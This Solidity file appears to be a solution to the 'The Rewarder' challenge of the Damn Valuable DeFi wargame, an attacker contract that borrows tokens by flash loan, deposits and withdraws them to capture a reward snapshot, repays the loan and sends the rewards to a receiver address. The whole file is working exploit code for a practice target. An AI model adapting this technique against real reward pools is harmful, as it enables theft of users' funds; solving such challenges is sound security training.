// SPDX-License-Identifier: MIT
pragma solidity =0.8.19;

import {DamnValuableToken} from "@main/DamnValuableToken.sol";
import {FlashLoanerPool} from "@main/the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool} from "@main/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "@main/the-rewarder/RewardToken.sol";

contract TheRewarderPoolAttacker {

    DamnValuableToken liquidityToken;
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    RewardToken rewardToken;

    address receiver;


    constructor(
        address _rewardToken,
        address _loanerPool,
        address _rewarderPool,
        address liquidityTokenAddress,
        address _receiver
    ) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        flashLoanPool = FlashLoanerPool(_loanerPool);
        rewarderPool = TheRewarderPool(_rewarderPool);
        rewardToken = RewardToken(_rewardToken);
        receiver = _receiver;
       
    }

    function attack() external {
        flashLoanPool.flashLoan(1_000_000 ether);
    }

    // callbackd by FlashLoanPool contract
    function receiveFlashLoan(uint256 amount) external {
        uint256 balance = liquidityToken.balanceOf(address(this));
        liquidityToken.approve(address(rewarderPool), balance);
        rewarderPool.deposit(balance);
        rewarderPool.withdraw(balance);
        // Return funds to pool
        liquidityToken.transfer(address(flashLoanPool), amount);
        // transfer rewards to attackerWallet
        rewardToken.transfer(receiver, rewardToken.balanceOf(address(this)));
    }

}